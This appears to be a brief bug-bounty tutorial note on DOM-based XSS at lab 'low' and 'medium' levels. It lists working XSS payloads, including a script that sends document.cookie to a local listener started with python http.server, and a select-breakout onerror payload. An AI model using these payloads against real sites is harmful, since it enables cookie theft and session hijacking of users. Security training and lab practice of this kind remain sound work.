# bug-bounty-tutorial
bug bounty tutorial

## 16.xss dom

### low
```
<script>alert('hacked')</script>
<script>alert(document.cookie)</script>

python -m http.server 1337
webup
<script>window.location='http://127.0.0.1:1337?cookie='+document.cookie</script>
```

### medium
```
</select><image src/onerror=alert(1)>
```
